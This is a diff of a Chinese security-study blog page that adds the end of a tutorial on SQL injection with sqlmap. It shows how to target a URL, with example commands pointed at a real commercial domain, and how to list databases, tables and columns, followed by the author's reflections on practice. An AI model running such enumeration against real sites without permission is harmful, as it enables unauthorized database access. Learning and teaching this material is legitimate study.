+<h4 id="2-指定目标-U"><a href="#2-指定目标-U" class="headerlink" title="2.指定目标 U"></a>2.指定目标 <code>U</code></h4><p>使用参数 <code>-u</code> 或 <code>–url</code> 指定一个 URL 作为目标，该参数后跟一个表示 URL 的字符串，还可以指定端口，如：</p>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "www.baidu.com/user.php?id=7"
+sqlmap.py -url "www.baidu.com:8080/user.php?id=7"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h4 id="3-列库-dbs"><a href="#3-列库-dbs" class="headerlink" title="3. 列库 dbs"></a>3. 列库 <code>dbs</code></h4><p>在检测出了存在注入后，就要进行对数据库的列举，命令是 <code>--dbs</code></p>
+<h4 id="4-列表-tables"><a href="#4-列表-tables" class="headerlink" title="4. 列表 tables"></a>4. 列表 <code>tables</code></h4><p>在列出了 Web 程序的库后，要根据这个库来列出表，命令是 <code>-D ‘库名’ --tables</code></p>
+<h4 id="5-列出表中字段-columns"><a href="#5-列出表中字段-columns" class="headerlink" title="5. 列出表中字段 columns"></a>5. 列出表中字段 <code>columns</code></h4><p>得到了库和表之后，可以根据这个库表来列出表里的字段进行数据的读取，命令是 <code>-D ‘库名’ -T ‘表名’ --columns</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201601814.png" alt="image-20210208201601814"></p>
+<p>这些只是一些枚举常用的，更多用法慢慢解锁吧</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>感觉对于一些注入了解的还是不够深，有时候碰到新题自己试了各种方法总是要很久才做的出来。</p>
+<p>也可能是我数据库学的不怎么样，如果对数据库越熟悉的话做题起来应该会如鱼得水。</p>
+<p>自己目前也只是学了一个mysql，打算有空看看其他的数据库。</p>
+<p>其次sqlmap也还是用的不熟练，还是需要多去刷题多练练啊。</p>
 
                 
             </div>
@@ -539,7 +621,7 @@ adb install -r -d  //+apk路径<span aria-hidden="true" class="line-numbers-rows
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://anwar211.top/web-ji-chu/web-ji-chu/">https://anwar211.top/web-ji-chu/web-ji-chu/</a>
+                    <a href="https://anwar211.top/2020/chang-jian-lou-dong/sql-zhu-ru-yuan-li-ji-qi-sqlmap-de-shi-yong/">https://anwar211.top/2020/chang-jian-lou-dong/sql-zhu-ru-yuan-li-ji-qi-sqlmap-de-shi-yong/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -625,12 +707,12 @@ adb install -r -d  //+apk路径<span aria-hidden="true" class="line-numbers-rows
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/web-ji-chu/zheng-ze-biao-da-shi-xue-xi/">
+                <a href="/2020/ba-chang-xue-xi/upload-labs/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208210010451.png" class="responsive-img" alt="正则表达式学习">
+                        <img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208205421280.png" class="responsive-img" alt="upload-labs">
                         
-                        <span class="card-title">正则表达式学习</span>
+                        <span class="card-title">upload-labs</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -641,7 +723,7 @@ adb install -r -d  //+apk路径<span aria-hidden="true" class="line-numbers-rows
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-11
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-29
                         </span>
                         <span class="publish-author">
                             
@@ -670,15 +752,16 @@ adb install -r -d  //+apk路径<span aria-hidden="true" class="line-numbers-rows
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/web-ji-chu/web-ji-chu/">
+                <a href="/2020/chang-jian-lou-dong/php-chang-jian-lou-dong/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208193831482.png" class="responsive-img" alt="web基础">
                         
-                        <span class="card-title">web基础</span>
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="php常见漏洞">
+                        
+                        <span class="card-title">php常见漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -689,7 +772,7 @@ adb install -r -d  //+apk路径<span aria-hidden="true" class="line-numbers-rows
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-26
                             </span>
                         <span class="publish-author">
                             
@@ -703,7 +786,6 @@ adb install -r -d  //+apk路径<span aria-hidden="true" class="line-numbers-rows
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
